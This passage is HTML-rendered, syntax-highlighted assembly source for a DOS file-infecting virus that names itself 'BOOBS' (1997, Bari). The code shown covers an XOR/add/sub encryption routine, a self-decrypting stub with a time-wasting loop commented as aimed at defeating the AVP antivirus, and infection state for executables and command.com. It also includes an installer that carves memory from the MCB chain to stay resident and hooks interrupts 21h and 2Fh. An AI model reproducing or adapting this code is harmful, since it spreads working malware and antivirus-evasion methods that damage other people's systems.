         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">Data_Buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">REAL_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@uncr_code</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Criptate</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Cripstyle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">034h</span><span class="sc0">                                 </span><span class="sc1">; xor</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04h</span><span class="sc0">                                  </span><span class="sc1">; add</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02ch</span><span class="sc0">                                 </span><span class="sc1">; sub</span><span class="sc0">

</span><span class="sc5">Uncripstyle</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">34h</span><span class="sc0">                                  </span><span class="sc1">; xor</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2ch</span><span class="sc0">                                  </span><span class="sc1">; sub</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04h</span><span class="sc0">                                  </span><span class="sc1">; add</span><span class="sc0">

</span><span class="sc5">Message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'|||-(BOOBS-)||| Virus , Once again deep in Terronia Land '</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'1997 Bari'</span><span class="sc0">

</span><span class="sc5">intr_sub_w</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4b00h</span><span class="sc4">,</span><span class="sc2">4b01h</span><span class="sc4">,</span><span class="sc2">6c00h</span><span class="sc0">
</span><span class="sc5">intr_sub_b</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">MZsig</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">ZMsig</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc12">'MZ'</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">NONCRYPTED</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">@uncr_code</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc0">
         </span><span class="sc5">first_addr</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                             </span><span class="sc1">; mov si,first_addr</span><span class="sc0">

</span><span class="sc5">@uncr</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02eh</span><span class="sc0">                                     </span><span class="sc1">; xor cs:[si]</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
         </span><span class="sc5">uncripmode</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">k1_code</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4000</span><span class="sc0">                                 </span><span class="sc1">; do-nothing loop</span><span class="sc0">
</span><span class="sc5">@m1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; to waste time</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; to</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@m1</span><span class="sc0">                                    </span><span class="sc1">; fuck AVP</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">
         </span><span class="sc5">cmp_addr</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                </span><span class="sc1">; cmp si,</span><span class="sc0">

         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@uncr</span><span class="sc0">

</span><span class="sc5">@end</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AfterCryp</span><span class="sc0">

</span><span class="sc5">@com_buf</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">templateheader</span><span class="sc0"> </span><span class="sc5">FileheaderRecord</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">                  </span><span class="sc1">; real file header</span><span class="sc0">

</span><span class="sc5">REAL_CODE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">Fileheader</span><span class="sc0">   </span><span class="sc5">FileheaderRecord</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">                    </span><span class="sc1">; header</span><span class="sc0">
</span><span class="sc5">file_status</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                   </span><span class="sc1">; infection flag</span><span class="sc0">
</span><span class="sc5">file_type</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sleep</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                   </span><span class="sc1">; flag for Windows 3.X</span><span class="sc0">
</span><span class="sc5">command_flag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                   </span><span class="sc1">; infect command.com ?</span><span class="sc0">
</span><span class="sc5">Searchrec</span><span class="sc0">    </span><span class="sc5">Searchrecord</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">                        </span><span class="sc1">; date &amp; time record</span><span class="sc0">
</span><span class="sc5">SearchStack</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">Maxfiles</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; stack for f-handle</span><span class="sc0">
</span><span class="sc5">FindVar</span><span class="sc0">      </span><span class="sc5">Findrecord</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">                          </span><span class="sc1">; findfirst &amp; findnext</span><span class="sc0">
</span><span class="sc5">SFT</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03bh</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; System File Table Buffer</span><span class="sc0">
</span><span class="sc5">DTAofs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                   </span><span class="sc1">; DTA for Findfirst,next</span><span class="sc0">
</span><span class="sc5">DTASeg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">COMSeg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                   </span><span class="sc1">; SEG for command.com</span><span class="sc0">
</span><span class="sc5">f_size</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                   </span><span class="sc1">; com size</span><span class="sc0">
</span><span class="sc5">Data_Buffer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">VIR_TRUE_LEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; Virus temp buffer</span><span class="sc0">


</span><span class="sc5">END_TSR</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">


</span><span class="sc5">main</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                                    </span><span class="sc1">; DS = PSP</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">; AX = MCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc5">VIR_PAR</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">                      </span><span class="sc1">; Z nell'ultimo MCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0008</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc5">VIR_PAR</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">

             </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">; SEG TSR</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">VIR_LEN</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">          </span><span class="sc6">movsd</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">clean_x_stack</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOK_21</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">TRAPPED_21</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOK_2F</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0bch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">TRAPPED_2F</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">sleep</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">command_flag</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">

         </span><span class="sc6">sti</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">CSeg</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">
      </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">

</span></div></body>
</html>
